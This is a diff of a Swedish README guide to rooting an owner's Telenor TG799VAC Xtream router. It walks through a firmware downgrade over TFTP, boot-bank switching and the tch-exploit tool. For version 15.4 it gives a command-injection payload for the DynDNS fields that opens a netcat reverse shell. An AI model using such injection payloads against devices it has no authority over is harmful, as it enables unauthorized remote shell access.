@@ -2,76 +2,76 @@
 
 Guide till Root Telenor TG799VAC Xtream > 18.1
 
-Ska forsoka gora guiden sa latt som mojlig men lite forkunskaper kravs. 
+Ska försöka göra guiden så lätt som möjlig men lite förkunskaper krävs. 
 
-## Varfor root?
+## Varför root?
 
-Du vill inte ha nagra bakdorrar i din router.
-Du vill kunna gora installningar som inte annars gar pga minimal "hemsida"
+Du vill inte ha några bakdörrar i din router.
+Du vill kunna göra inställningar som inte annars går pga minimal "hemsida"
 
 ## Under konstruktion!
 
-Skriver eftersom hur man gor.
+Skriver eftersom hur man gör.
 
 ## Start
 
-**Detta ar for version > 18.1**
+**Detta är för version > 18.1**
 
 
-Om du ska kunna roota routern maste vi lagga in en aldre programvara. **17.1** 
+Om du ska kunna roota routern måste vi lägga in en äldre programvara. **17.1** 
 
 ## Setup TFTP
 
-Du kan valja mellan t.ex:
+Du kan välja mellan t.ex:
 
-Kor du https://github.com/BoLaMN/tch-exploit/releases behovs bara det programmet bade for TFTP och root.
+Kör du https://github.com/BoLaMN/tch-exploit/releases behövs bara det programmet både för TFTP och root.
 
-sudo ./tch-exploit-linux --ip="192.168.0.2 (din dators ipadress)" --tftp='sokvag till RBI'
+sudo ./tch-exploit-linux --ip="192.168.0.2 (din dators ipadress)" --tftp='sökväg till RBI'
 
 eller
 
-sudo ./tch-exploit-linux --eth="en0"--tftp='sokvag vill RBI'
+sudo ./tch-exploit-linux --eth="en0"--tftp='sökväg vill RBI'
 
 
 
-Forst ladda ner TFTP sa vi kan overfora programvaran.
+Först ladda ner TFTP så vi kan överföra programvaran.
 Download https://bitbucket.org/phjounin/tftpd64/downloads/Tftpd64-4.64-setup.exe
 
 Mjukvara: https://github.com/Vargaskri/Root-Technicolor-TG799VAC-Xtream-Telenor/blob/master/RBI/TN_SWE_TG799vacXtream_17.1.7937-1281014-20180313133921-Official.rbi.torrent
 
-Lagg filen i rooten i TFTP mappen.
+Lägg filen i rooten i TFTP mappen.
 
-Kor TFTP som Administrator. andra installninar som bilderna visar. TFTP kan ibland vara brakig men bor ga bra. 
+Kör TFTP som Administratör. Ändra inställninar som bilderna visar. TFTP kan ibland vara bråkig men bör gå bra. 
 
 ![T F T P Settings](images/TFTPSettings.png)
 
 ![T F T P Settings2](images/TFTPSettings2.png)
 
 1. Ha routern avslagen.
-1. Satt in en natverkskabel i port 1 pa routern och i dator.
-1. Ta ett gem eller nat att halla in resetknappen med medans du slar igang routern. Hall in gemet tills ethernetlampan borjar blinka.
-1. Nu borde TFTP fore over mjukvaran i routern om allt gar som de ska.
-1. Lat routern fa starta upp, logga in och kolla om du har version **17.1**
-    1. Om du har det fortsatt **har**
-    1. Om **INTE** maste vi byta bootad bank.
+1. Sätt in en nätverkskabel i port 1 på routern och i dator.
+1. Ta ett gem eller nåt att hålla in resetknappen med medans du slår igång routern. Håll in gemet tills ethernetlampan börjar blinka.
+1. Nu borde TFTP före över mjukvaran i routern om allt går som de ska.
+1. Låt routern få starta upp, logga in och kolla om du har version **17.1**
+    1. Om du har det fortsätt **här**
+    1. Om **INTE** måste vi byta bootad bank.
 
 
 ## Byta bootad bank!
 
-Sahar byter jag mellan bank_1 och 2.  
-Starta ett tidtagarur pa datorn eller mobil.
-1. Sla pa routern och tidtagaruret. 
-2. Efter 30 sekunder tryck snabbt pa stromknappen (av, pa) Om du gjorde ratt kommer alla lampor pa routern lysa upp lite svagt sen startar routern om.
-3. Starta om tidtagaruret och efter 30 sekunder sla av och routern fort igen. Gor samma sak en gang till darefter lat routern starta upp. Da bor du ha bootat **17.1**
+Såhär byter jag mellan bank_1 och 2.  
+Starta ett tidtagarur på datorn eller mobil.
+1. Slå på routern och tidtagaruret. 
+2. Efter 30 sekunder tryck snabbt på strömknappen (av, på) Om du gjorde rätt kommer alla lampor på routern lysa upp lite svagt sen startar routern om.
+3. Starta om tidtagaruret och efter 30 sekunder slå av och routern fort igen. Gör samma sak en gång till därefter låt routern starta upp. Då bör du ha bootat **17.1**
 
 
-## Sjalva root delen.
+## Själva root delen.
 
-Nu nar du har 17.1 skall du anvanda:
+Nu när du har 17.1 skall du använda:
 
 https://github.com/BoLaMN/tch-exploit/releases
 
-Natverkskabel ska in i WAN(roda porten) pa routern. Och routern maste nollstallas ifall den blivit anvand pa internet.
+Nätverkskabel ska in i WAN(röda porten) på routern. Och routern måste nollställas ifall den blivit använd på internet.
 
 Under Linux:
 
@@ -79,28 +79,28 @@ Under Linux:
 
 ![TCH-Exploit](images/tch1.png)
 
-Folj instruktionerna och byt IP till det som star.
-Efter en stund kommer det en massa text da far routern ett IP nummer. En stund senare kommer annu mera text och va da beredd pa att trycka
-pa **WPS knappen** nar det star att du ska gora det. 
-Sen ar det bara att flytta natverkskabeln till LAN pa routern och logga in med SSH med anvandare "root" losenord "root"
+Följ instruktionerna och byt IP till det som står.
+Efter en stund kommer det en massa text då får routern ett IP nummer. En stund senare kommer ännu mera text och va då beredd på att trycka
+på **WPS knappen** när det står att du ska göra det. 
+Sen är det bara att flytta nätverkskabeln till LAN på routern och logga in med SSH med användare "root" lösenord "root"
 
 
 Under Windows:
 
-Öppna en kommandotolk som Administrator.
+Öppna en kommandotolk som Administratör.
 
-Ga till mappen dar ni lagt filerna.
+Gå till mappen där ni lagt filerna.
 
-Kor tch-exploit-win.exe
+Kör tch-exploit-win.exe
 
 ## Version 15.4
 
-Du behover installera netcat pa windows ifall du inte kor linux.
+Du behöver installera netcat på windows ifall du inte kör linux.
 
 I en terminal skriv **nc -lvvp "port"**
  
-Logga in pa routern ga till DynDNS:
-Klistra in detta pa Domain,user,password sla pa DynDNS och spara.
+Logga in på routern gå till DynDNS:
+Klistra in detta på Domain,user,password slå på DynDNS och spara.
 **::::::'nc "Din dators IP" "porten du angav i terminalen" -e /bin/sh'**
 
-I din termninal kommer du nu fa ett skal.
+I din termninal kommer du nu få ett skal.
